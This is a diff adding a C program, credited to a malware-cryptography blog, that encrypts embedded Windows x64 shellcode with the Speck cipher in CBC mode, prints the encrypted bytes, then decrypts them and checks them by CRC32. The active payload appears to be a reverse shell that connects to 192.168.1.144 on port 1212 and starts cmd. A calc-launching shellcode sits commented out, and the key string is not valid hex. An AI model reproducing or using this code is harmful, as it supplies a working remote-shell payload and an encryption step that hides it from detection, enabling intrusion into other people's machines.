@@ -1,0 +1,209 @@
+// Based on original code from:
+// https://cocomelonc.github.io/malware/2025/05/29/malware-cryptography-42.html
+
+#include <stdio.h>
+#include <stdint.h>
+#include <string.h>
+#include <stdlib.h>
+#include <time.h>
+
+#define ROUNDS 45
+#define BLOCK_BYTES 16
+
+uint64_t roundKeys[ROUNDS];
+
+// Generate the CRC32 table
+uint32_t crc32Table[256];
+void generateCrc32Table() {
+	for (uint32_t i = 0; i < 256; i++) {
+		uint32_t c = i;
+		for (int j = 0; j < 8; j++) {
+			c = (c & 1) ? (0xEDB88320 ^ (c >> 1)) : (c >> 1);
+		}
+		crc32Table[i] = c;
+	}
+}
+
+uint32_t crc32(const unsigned char* data, size_t length) {
+	uint32_t crc = 0xFFFFFFFF;
+	for (size_t i = 0; i < length; i++) {
+		crc = crc32Table[(crc ^ data[i]) & 0xFF] ^ (crc >> 8);
+	}
+	return crc ^ 0xFFFFFFFF;
+}
+
+void parseHexKey(const char* keyStr, uint64_t key[2]) {
+	char buffer[17] = { 0 };
+	strncpy(buffer, keyStr, 16);
+	key[0] = strtoull(buffer, NULL, 16);
+	strncpy(buffer, keyStr + 16, 16);
+	key[1] = strtoull(buffer, NULL, 16);
+}
+
+uint64_t rol(uint64_t x, int r) {
+	return (x << r) | (x >> (64 - r));
+}
+
+uint64_t ror(uint64_t x, int r) {
+	return (x >> r) | (x << (64 - r));
+}
+
+void speckKeySchedule(uint64_t key[2]) {
+	roundKeys[0] = key[0];
+	uint64_t b = key[1];
+	for (int i = 0; i < ROUNDS - 1; i++) {
+		b = (ror(b, 8) + roundKeys[i]) ^ i;
+		roundKeys[i + 1] = rol(roundKeys[i], 3) ^ b;
+	}
+}
+
+void speckEncrypt(uint64_t* x, uint64_t* y) {
+	for (int i = 0; i < ROUNDS; i++) {
+		*x = (ror(*x, 8) + *y) ^ roundKeys[i];
+		*y = rol(*y, 3) ^ *x;
+	}
+}
+
+void speckDecrypt(uint64_t* x, uint64_t* y) {
+	for (int i = ROUNDS - 1; i >= 0; i--) {
+		*y = ror(*y ^ *x, 3);
+		*x = rol((*x ^ roundKeys[i]) - *y, 8);
+	}
+}
+
+// Simple 64-bit random number generator
+uint64_t rand64() {
+	return ((uint64_t)rand() << 32) | rand();
+}
+
+int main() {
+	//char shellcode[] = "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
+	//	"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
+	//	"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
+	//	"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
+	//	"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
+	//	"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
+	//	"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
+	//	"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
+	//	"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
+	//	"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
+	//	"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
+	//	"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
+	//	"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
+	//	"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
+	//	"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
+	//	"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
+	//	"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
+	//	"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
+	//	"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
+	//	"\xd5\x63\x61\x6c\x63\x00";
+
+
+	generateCrc32Table();
+	srand((unsigned int)time(NULL)); // Seed for random IV
+
+	unsigned char payload[] = 
+		"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
+		"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
+		"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
+		"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
+		"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
+		"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
+		"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
+		"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
+		"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
+		"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
+		"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
+		"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
+		"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
+		"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
+		"\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33"
+		"\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00"
+		"\x00\x49\x89\xe5\x49\xbc\x02\x00\x04\xbc\xc0\xa8\x01\x90"
+		"\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07"
+		"\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29"
+		"\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48"
+		"\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea"
+		"\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89"
+		"\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x48\x81"
+		"\xc4\x40\x02\x00\x00\x49\xb8\x63\x6d\x64\x00\x00\x00\x00"
+		"\x00\x41\x50\x41\x50\x48\x89\xe2\x57\x57\x57\x4d\x31\xc0"
+		"\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44\x24\x54\x01\x01"
+		"\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6\x56\x50\x41"
+		"\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff\xc8\x4d"
+		"\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5\x48"
+		"\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff"
+		"\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5"
+		"\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
+		"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5";
+
+
+	const char* keyStr = "f7Ea9C2b4D10xL8zQ5Wk3P6rIeG0jN7o";
+	//const char* keyStr = "19181110090801001110980801000908";
+	uint64_t key[2];
+	parseHexKey(keyStr, key);
+	speckKeySchedule(key);
+
+	int payloadLen = sizeof(payload) - 1;
+	int paddedLen = (payloadLen + BLOCK_BYTES - 1) & ~(BLOCK_BYTES - 1);
+
+	// Allocate buffer for IV + encrypted shellcode
+	unsigned char* encryptedBuffer = (unsigned char*)calloc(1, BLOCK_BYTES + paddedLen);
+	if (!encryptedBuffer) return 1;
+
+	// Copy shellcode to encryption buffer (implicit zero padding)
+	memcpy(encryptedBuffer + BLOCK_BYTES, payload, payloadLen);
+
+	// Create random IV and place it at the start of the buffer
+	uint64_t* iv = (uint64_t*)encryptedBuffer;
+	iv[0] = rand64();
+	iv[1] = rand64();
+
+	// Speck encryption in CBC mode
+	uint64_t prev[2] = { iv[0], iv[1] };
+	for (int i = 0; i < paddedLen; i += BLOCK_BYTES) {
+		uint64_t* block = (uint64_t*)(encryptedBuffer + BLOCK_BYTES + i);
+		block[0] ^= prev[0];
+		block[1] ^= prev[1];
+		speckEncrypt(&block[0], &block[1]);
+		prev[0] = block[0];
+		prev[1] = block[1];
+	}
+
+	printf("Encrypted Shellcode + IV:\n");
+	for (int i = 0; i < BLOCK_BYTES + paddedLen; i++) {
+		printf("\\x%02x", encryptedBuffer[i]);
+	}
+	printf("\n\n");
+
+	// ==================== DECRYPTION ====================
+	unsigned char* decryptBuffer = (unsigned char*)malloc(paddedLen);
+	memcpy(decryptBuffer, encryptedBuffer + BLOCK_BYTES, paddedLen);
+
+	uint64_t prevDecrypt[2] = { iv[0], iv[1] };
+	for (int i = 0; i < paddedLen; i += BLOCK_BYTES) {
+		uint64_t* block = (uint64_t*)(decryptBuffer + i);
+		uint64_t temp[2] = { block[0], block[1] };
+		speckDecrypt(&block[0], &block[1]);
+		block[0] ^= prevDecrypt[0];
+		block[1] ^= prevDecrypt[1];
+		prevDecrypt[0] = temp[0];
+		prevDecrypt[1] = temp[1];
+	}
+
+	// CRC32 verification
+	uint32_t origCrc = crc32(payload, payloadLen);
+	uint32_t decCrc = crc32(decryptBuffer, payloadLen);
+
+	printf("Decrypted Payload CRC32: 0x%08X\n", decCrc);
+	printf("Original  Payload CRC32: 0x%08X\n", origCrc);
+
+	if (origCrc == decCrc)
+		printf("\nDecryption OK: payload restored.\n");
+	else
+		printf("\nDecryption FAILED: corruption detected.\n");
+
+	free(encryptedBuffer);
+	free(decryptBuffer);
+	return 0;
+}
